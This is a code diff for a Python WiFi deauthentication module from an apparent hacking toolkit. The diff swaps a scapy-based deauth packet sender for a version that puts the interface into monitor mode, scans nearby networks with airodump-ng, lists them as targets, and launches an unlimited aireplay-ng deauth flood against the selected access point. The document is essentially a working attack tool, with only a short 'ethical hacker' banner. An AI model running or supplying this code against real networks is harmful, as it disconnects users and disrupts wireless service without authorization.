@@ -23,67 +23,116 @@ Warning to Code Thieves:
 ✅ Be an ethical hacker. Respect developers' hard work and give credit where it's due.
 
 """
-
-import os
-import time
+from includes import utils
+from includes import banner
+from rich.console import Console
+from rich.panel import Panel
 import subprocess
-from scapy.all import *
+import time
+import re
+import os
+from rich.console import Console
+from rich.panel import Panel
+import csv
 
-def set_monitor_mode(interface):
-    print(f"[+] Enabling monitor mode on {interface}...")
-    subprocess.call(["airmon-ng", "check", "kill"])
-    subprocess.call(["airmon-ng", "start", interface])
-    return interface + "mon"
+console = Console()
 
-def get_channel(bssid, iface):
-    print(f"[+] Scanning to find channel for BSSID: {bssid}")
-    try:
-        result = subprocess.check_output(["airodump-ng", iface, "-w", "/tmp/deauth_scan", "--output-format", "csv"], timeout=10)
-    except subprocess.TimeoutExpired:
-        pass  # We just want the file, not long scan
+def parse_csv(file_path):
+    wifi_targets = []
+    with open(file_path, newline='') as csvfile:
+        reader = csv.reader(csvfile)
+        found_header = False
+        for row in reader:
+            if not row:
+                continue
+            if row[0].strip() == 'BSSID':
+                found_header = True
+                continue
+            if found_header:
+                if len(row) >= 14:
+                    bssid = row[0].strip()
+                    essid = row[13].strip()
+                    channel = row[3].strip()
+                    if essid:
+                        wifi_targets.append((bssid, essid,channel))
+    return wifi_targets
 
-    try:
-        with open("/tmp/deauth_scan-01.csv", "r") as f:
-            lines = f.readlines()
-            for line in lines:
-                if bssid.upper() in line.upper():
-                    parts = line.split(",")
-                    return parts[3].strip()
-    except FileNotFoundError:
-        print("[!] Could not find scan results.")
+
+def get_wifi_targets(monitor_iface):
+    console.print("[yellow]📡 Scanning for WiFi networks... 10-second scan. Press Ctrl+C to stop.[/yellow]")
+    print(monitor_iface)
+    os.system('rm *.csv')
+    output_file = "scan_output"
     
-    return None
-
-def perform_deauth(bssid, iface, channel, count=0):
-    print(f"[+] Setting {iface} to channel {channel}")
-    os.system(f"iwconfig {iface} channel {channel}")
-    
-    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
-    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-    
-    print(f"[+] Sending deauth packets to {bssid} on channel {channel} via {iface}")
     try:
-        sendp(packet, iface=iface, count=count, inter=0.1, verbose=1)
+        banner.show_banner()
+        try:
+            selected = int(input("🛜  Enter seconds to scan WiFi networks: ").strip() or 10)
+        except ValueError:
+            print("❌ Invalid input! Using default 10 seconds.")
+            selected = 10
+        console.print("[yellow bold]⏳ Starting WiFi scan in 5 seconds...[/yellow bold]")
+        console.print("[yellow]⚠️ It will run for 10 seconds. Please do not interrupt any commands during this time.\n[/yellow]")
+        for i in range(5, 0, -1):
+            
+            console.print(f"[cyan]Starting in {i}...[/cyan]", end="\r")
+            time.sleep(1)
+        command = f"sudo airodump-ng {monitor_iface} --output-format csv --write {output_file}"
+        os.system(f"{command} &")
+        time.sleep(selected)
+        os.system("pkill airodump-ng")
+        time.sleep(1)
+        console.print("[green]📄 Showing scan output from the CSV file(s):[/green]")
+        for file in os.listdir():
+            if file.endswith(".csv"):
+                with open(file, 'r') as f:
+                    wifi_data = parse_csv(file)
+        return wifi_data
+    except Exception as e:
+        console.print(f"[red]❌ Error: {e}[/red]")
+
+def enable_monitor_mode(interface):
+    try:
+        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
+        subprocess.run(["iw", interface, "set", "monitor", "none"], check=True)
+        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
+        console.print(f"[green]✅ {interface} is now in monitor mode.[/green]")
+    except subprocess.CalledProcessError:
+        console.print(f"[red]❌ Failed to enable monitor mode on {interface}[/red]")
+        exit()
+
+def deauth_attack(interface, bssid, channel):
+    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    console.print(f"\n[red]⚠️ Starting deauth attack on {bssid} (channel {channel})...[/red]\n")
+    try:
+        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
     except KeyboardInterrupt:
-        print("\n[!] Attack interrupted.")
+        time.sleep(2)
+        console.print("\n[cyan]🛑 Deauth attack stopped by user[/cyan]\n")
 
-def start_deauth():
-    os.system("clear")
-    print("=== WIFIHacker | Deauth Attack Module ===")
+
+def start_deauth(interface):
+    enable_monitor_mode(interface)
+    banner.show_banner()
+    targets = get_wifi_targets(interface)
+
+    if not targets:
+        console.print("[red]❌ No WiFi targets found. Exiting...[/red]")
+        return
+
+    banner.show_wifi_targets(targets)  
     
-    interface = input("[?] Enter wireless interface (e.g., wlan0): ").strip()
-    bssid = input("[?] Enter target BSSID (MAC of AP): ").strip()
-    
-    monitor_iface = set_monitor_mode(interface)
-    channel = get_channel(bssid, monitor_iface)
-    
-    if channel is None:
-        print("[!] Could not detect channel. Please enter manually.")
-        channel = input("[?] Channel: ").strip()
+    selected = input("🛜  Enter your WiFi target  (number): ").strip()
+    try:
+        if selected.strip() == "0":
+            exit()  
+        target = targets[int(selected) - 1]
+    except (IndexError, ValueError):
+        banner.invalid_Selection()
+        exit()
 
-    perform_deauth(bssid, monitor_iface, channel)
+        
+    deauth_attack(interface,target[0],target[2])
+        
 
-    print("\n[+] Done.")
-
-if __name__ == "__main__":
-    start_deauth()
+  
